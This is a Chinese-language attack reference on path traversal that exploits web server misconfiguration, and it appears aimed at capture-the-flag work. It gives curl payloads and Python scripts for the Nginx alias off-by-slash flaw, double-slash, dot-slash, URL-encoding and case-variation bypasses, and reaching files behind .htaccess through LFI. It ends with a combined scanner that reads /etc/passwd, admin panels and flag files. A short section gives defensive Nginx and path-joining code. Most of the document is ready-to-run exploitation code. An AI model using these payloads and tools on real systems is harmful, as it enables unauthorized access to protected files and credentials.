# 路径遍历-配置绕过 攻击库

## 漏洞概述

路径遍历(Path Traversal)配置绕过是指利用Web服务器(如Nginx、Apache)配置错误或路径规范化不一致,绕过访问控制限制,访问受保护目录和文件的攻击技术。这类漏洞常见于location配置、alias指令、URL rewrite规则等配置不当的场景。

**攻击价值**:
- 访问受保护的管理目录
- 读取敏感配置文件
- 绕过身份验证
- 访问源代码文件
- 读取备份文件

**常见场景**:
- Nginx alias配置错误
- Apache .htaccess绕过
- URL rewrite规则漏洞
- 路径规范化差异
- 符号链接利用

## 核心攻击技术

### 1. Nginx Alias Off-by-Slash漏洞

**原理**: Nginx location和alias配置时,尾随斜杠处理不当

**漏洞配置**:
```nginx
# 危险配置 - 缺少尾随斜杠
location /images {
    alias /var/www/html/images/;
}

# 或
location /static {
    alias /var/www/html/;  # location没有斜杠,alias有斜杠
}
```

**攻击载荷**:

```bash
# 基础利用
curl http://target.com/images../admin/

# 访问上层目录
curl http://target.com/images../../../etc/passwd

# 访问其他目录
curl http://target.com/static../app/config.php

# 读取flag
curl http://target.com/images../flag.txt
```

**Python利用脚本**:

```python
#!/usr/bin/env python3
import requests
import re

class NginxAliasExploit:
    """Nginx alias路径遍历利用"""
    
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
    
    def test_alias_vulnerability(self):
        """测试alias漏洞"""
        
        print("[*] 测试Nginx alias配置漏洞...\n")
        
        # 常见的location路径
        location_paths = [
            '/images',
            '/static',
            '/assets',
            '/files',
            '/uploads',
            '/media',
            '/public',
            '/resources',
        ]
        
        # 测试载荷
        test_paths = [
            '../',
            '../admin/',
            '../../../etc/passwd',
            '../flag.txt',
            '../../../flag',
        ]
        
        for location in location_paths:
            for test_path in test_paths:
                url = f"{self.target_url}{location}{test_path}"
                
                try:
                    response = requests.get(url, timeout=5)
                    
                    if response.status_code == 200:
                        print(f"[+] 可访问: {url}")
                        
                        # 检查响应内容
                        if 'root:' in response.text:
                            print(f"[!] 发现/etc/passwd!")
                            print(response.text[:500])
                        
                        elif 'flag' in response.text.lower():
                            print(f"[!!!] 发现FLAG!")
                            flag = re.search(r'flag\{[^}]+\}', response.text, re.I)
                            if flag:
                                print(f"FLAG: {flag.group()}")
                                return flag.group()
                        
                        elif len(response.text) > 0:
                            print(f"响应长度: {len(response.text)}")
                
                except Exception as e:
                    pass
        
        return None
    
    def exploit_admin_access(self):
        """利用alias漏洞访问admin目录"""
        
        print("\n[*] 尝试访问admin目录...\n")
        
        admin_paths = [
            '/images../admin/',
            '/images../admin/index.php',
            '/static../admin/',
            '/assets../admin/config.php',
        ]
        
        for path in admin_paths:
            url = self.target_url + path
            
            try:
                response = requests.get(url)
                
                if response.status_code == 200:
                    print(f"[+] 成功访问: {path}")
                    
                    if 'admin' in response.text.lower():
                        print("[!] 访问到admin内容!")
                        return response.text
            
            except:
                pass
        
        return None

# 使用示例
if __name__ == "__main__":
    exploiter = NginxAliasExploit("http://target.com")
    result = exploiter.test_alias_vulnerability()
    
    if not result:
        exploiter.exploit_admin_access()
```

### 2. 双斜杠路径遍历

**原理**: 某些服务器对双斜杠处理不当,可绕过路径验证

**攻击载荷**:

```bash
# 双斜杠绕过
curl http://target.com//admin/
curl http://target.com///admin/
curl http://target.com////admin/

# 组合路径遍历
curl http://target.com//admin//index.php
curl http://target.com/public/..//admin/

# 目录穿越
curl http://target.com//etc/passwd
curl http://target.com///flag.txt
```

**Python脚本**:

```python
def double_slash_bypass(base_url):
    """双斜杠绕过测试"""
    
    payloads = [
        '//admin/',
        '///admin/',
        '////admin/',
        '/admin//',
        '//admin//index.php',
        '//flag.txt',
        '///etc/passwd',
        '/public/..//admin/',
    ]
    
    for payload in payloads:
        url = base_url + payload
        
        try:
            response = requests.get(url, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] 可访问: {payload}")
                
                if 'flag' in response.text.lower():
                    print(f"[!!!] 发现FLAG: {payload}")
                    return response.text
        
        except:
            pass
    
    return None
```

### 3. 点和斜杠组合绕过

**原理**: 使用./、.//、....//等组合绕过过滤

**攻击载荷**:

```bash
# 单点斜杠
curl http://target.com/./admin/
curl http://target.com/././admin/

# 四点双斜杠
curl http://target.com/....//admin/
curl http://target.com/....//....//admin/

# 混合模式
curl http://target.com/.././admin/
curl http://target.com/./static/../admin/
```

**完整枚举脚本**:

```python
def dot_slash_bypass(target_url, target_path='/admin/'):
    """点斜杠组合绕过"""
    
    # 生成各种点斜杠组合
    patterns = [
        './',
        '././',
        './././',
        '..../',
        '....//',
        '....//..../',
        '.././',
        './.././',
    ]
    
    for pattern in patterns:
        # 尝试不同数量的重复
        for repeat in range(1, 5):
            payload = pattern * repeat + target_path.lstrip('/')
            url = target_url.rstrip('/') + '/' + payload
            
            try:
                response = requests.get(url, timeout=3)
                
                if response.status_code == 200:
                    print(f"[+] 成功: {payload}")
                    
                    if len(response.text) > 100:
                        print(f"    内容长度: {len(response.text)}")
                        
                        # 检查flag
                        if 'flag' in response.text.lower():
                            import re
                            flag = re.search(r'flag\{[^}]+\}', response.text, re.I)
                            if flag:
                                print(f"[!!!] FLAG: {flag.group()}")
                                return flag.group()
            
            except:
                pass
    
    return None
```

### 4. URL编码绕过

**原理**: 使用URL编码绕过路径过滤

**攻击载荷**:

```bash
# 单层编码
curl "http://target.com/%2e%2e/admin/"
curl "http://target.com/%2e%2e%2f%2e%2e%2fadmin/"

# 双层编码
curl "http://target.com/%252e%252e/admin/"
curl "http://target.com/%252e%252e%252fadmin/"

# 混合编码
curl "http://target.com/..%2fadmin/"
curl "http://target.com/%2e./admin/"
```

**编码生成脚本**:

```python
from urllib.parse import quote

def url_encode_bypass(target_url, target_path):
    """URL编码绕过"""
    
    # 基础路径遍历
    traversals = [
        '../',
        '../../',
        '../../../',
    ]
    
    for traversal in traversals:
        # 单层编码
        encoded_once = quote(traversal, safe='')
        url1 = f"{target_url}/{encoded_once}{target_path}"
        
        # 双层编码
        encoded_twice = quote(encoded_once, safe='')
        url2 = f"{target_url}/{encoded_twice}{target_path}"
        
        # 混合编码
        mixed = traversal.replace('/', '%2f')
        url3 = f"{target_url}/{mixed}{target_path}"
        
        for url in [url1, url2, url3]:
            try:
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"[+] 成功: {url}")
                    
                    if 'flag' in response.text.lower():
                        print("[!!!] 发现FLAG!")
                        return response.text
            
            except:
                pass
    
    return None
```

### 5. Apache .htaccess绕过

**原理**: .htaccess只阻止HTTP直接访问,不阻止服务器端访问

**场景**: 与LFI结合使用

**.htaccess配置**:
```apache
<Files "flag.txt">
    Order allow,deny
    Deny from all
</Files>
```

**绕过方法**:

```bash
# 直接访问被阻止
curl http://target.com/flag.txt
# 返回: 403 Forbidden

# 通过LFI绕过
curl "http://target.com/index.php?page=flag.txt"
# 成功读取!

# 或通过路径遍历
curl "http://target.com/public/../flag.txt"
```

**Python利用**:

```python
def htaccess_bypass_via_lfi(target_url, lfi_param, protected_file):
    """通过LFI绕过.htaccess保护"""
    
    # 方法1: 直接包含
    url1 = f"{target_url}?{lfi_param}={protected_file}"
    
    # 方法2: 路径遍历
    url2 = f"{target_url}?{lfi_param}=../{protected_file}"
    
    # 方法3: 完整路径
    url3 = f"{target_url}?{lfi_param}=/var/www/html/{protected_file}"
    
    for url in [url1, url2, url3]:
        try:
            response = requests.get(url)
            
            if response.status_code == 200 and len(response.text) > 0:
                print(f"[+] 绕过成功!")
                print(f"[+] URL: {url}")
                print(f"[+] 内容: {response.text[:500]}")
                
                return response.text
        
        except:
            pass
    
    return None
```

### 6. 大小写绕过

**原理**: 某些系统区分大小写,可通过大小写绕过访问控制

**攻击载荷**:

```bash
# 混合大小写
curl http://target.com/Admin/
curl http://target.com/ADMIN/
curl http://target.com/aDmIn/

# 文件名大小写
curl http://target.com/Flag.txt
curl http://target.com/FLAG.TXT
curl http://target.com/fLaG.tXt
```

**Python脚本**:

```python
def case_bypass(target_url, target_path):
    """大小写绕过"""
    
    import itertools
    
    # 生成所有大小写组合
    def generate_case_variations(s):
        variants = []
        
        # 全大写
        variants.append(s.upper())
        
        # 全小写
        variants.append(s.lower())
        
        # 首字母大写
        variants.append(s.capitalize())
        
        # 交替大小写
        alternating = ''.join([c.upper() if i % 2 == 0 else c.lower() 
                              for i, c in enumerate(s)])
        variants.append(alternating)
        
        return variants
    
    variations = generate_case_variations(target_path)
    
    for variant in variations:
        url = target_url + variant
        
        try:
            response = requests.get(url, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] 可访问: {variant}")
                return response.text
        
        except:
            pass
    
    return None
```

## 综合利用工具

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import quote

class PathTraversalConfigBypass:
    """路径遍历配置绕过综合工具"""
    
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.successful_paths = []
    
    def test_nginx_alias(self):
        """测试Nginx alias漏洞"""
        print("\n[*] 测试Nginx alias配置漏洞...")
        
        locations = ['/images', '/static', '/assets', '/files']
        targets = ['../admin/', '../flag.txt', '../../../etc/passwd']
        
        for loc in locations:
            for target in targets:
                url = f"{self.target_url}{loc}{target}"
                
                if self._test_url(url):
                    self.successful_paths.append(url)
    
    def test_double_slash(self):
        """测试双斜杠绕过"""
        print("\n[*] 测试双斜杠绕过...")
        
        paths = [
            '//admin/',
            '///admin/',
            '//flag.txt',
            '/public/..//admin/',
        ]
        
        for path in paths:
            url = self.target_url + path
            
            if self._test_url(url):
                self.successful_paths.append(url)
    
    def test_dot_slash_combinations(self):
        """测试点斜杠组合"""
        print("\n[*] 测试点斜杠组合...")
        
        patterns = ['..../', '....//','././', './.././']
        targets = ['admin/', 'flag.txt']
        
        for pattern in patterns:
            for repeat in range(1, 4):
                for target in targets:
                    payload = pattern * repeat + target
                    url = f"{self.target_url}/{payload}"
                    
                    if self._test_url(url):
                        self.successful_paths.append(url)
    
    def test_url_encoding(self):
        """测试URL编码绕过"""
        print("\n[*] 测试URL编码绕过...")
        
        paths = ['../admin/', '../../flag.txt']
        
        for path in paths:
            # 单层编码
            encoded = quote(path, safe='')
            url = f"{self.target_url}/{encoded}"
            
            if self._test_url(url):
                self.successful_paths.append(url)
    
    def test_case_variations(self):
        """测试大小写绕过"""
        print("\n[*] 测试大小写绕过...")
        
        paths = ['Admin/', 'ADMIN/', 'admin/']
        
        for path in paths:
            url = f"{self.target_url}/{path}"
            
            if self._test_url(url):
                self.successful_paths.append(url)
    
    def _test_url(self, url):
        """测试URL是否可访问"""
        try:
            response = requests.get(url, timeout=5)
            
            if response.status_code == 200 and len(response.text) > 0:
                print(f"  [+] 可访问: {url}")
                
                # 检查flag
                if 'flag' in response.text.lower():
                    flag = re.search(r'flag\{[^}]+\}', response.text, re.I)
                    if flag:
                        print(f"  [!!!] FLAG: {flag.group()}")
                
                return True
        
        except:
            pass
        
        return False
    
    def run_all_tests(self):
        """运行所有测试"""
        print(f"\n{'='*60}")
        print(f"路径遍历配置绕过测试 - {self.target_url}")
        print(f"{'='*60}")
        
        self.test_nginx_alias()
        self.test_double_slash()
        self.test_dot_slash_combinations()
        self.test_url_encoding()
        self.test_case_variations()
        
        print(f"\n{'='*60}")
        print(f"测试完成! 发现 {len(self.successful_paths)} 个可访问路径")
        print(f"{'='*60}\n")
        
        if self.successful_paths:
            print("成功的路径:")
            for path in self.successful_paths[:10]:
                print(f"  {path}")

# 使用示例
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("用法: python3 path_traversal.py <target_url>")
        print("示例: python3 path_traversal.py http://target.com")
        sys.exit(1)
    
    tester = PathTraversalConfigBypass(sys.argv[1])
    tester.run_all_tests()
```

## 防御检测

**安全的Nginx配置**:

```nginx
# 正确的alias配置
location /images/ {  # 添加尾随斜杠
    alias /var/www/html/images/;  # 完整路径且末尾有斜杠
}

# 禁止访问敏感目录
location ~ ^/(admin|private) {
    deny all;
    return 403;
}

# 禁止路径遍历
location / {
    # 检测路径遍历
    if ($request_uri ~* "\.\./") {
        return 403;
    }
}
```

**应用层防护**:

```python
import os

def safe_path_join(base_dir, user_path):
    """安全的路径拼接"""
    
    # 规范化路径
    abs_base = os.path.abspath(base_dir)
    abs_user = os.path.abspath(os.path.join(base_dir, user_path))
    
    # 检查是否在允许的目录内
    if not abs_user.startswith(abs_base):
        raise ValueError("Path traversal detected")
    
    return abs_user
```

## 关键成功要点

1. **识别配置错误**: 寻找alias、location配置不当
2. **路径规范化**: 利用不同系统对路径处理的差异
3. **编码绕过**: 使用各种编码技术绕过过滤
4. **组合攻击**: 结合多种技术增加成功率
5. **枚举测试**: 测试多种可能的路径和模式

## 成功标志

- 绕过访问控制访问受保护目录
- 读取敏感文件如/etc/passwd
- 访问admin管理面板
- 读取应用配置文件
- 获取flag或其他敏感信息
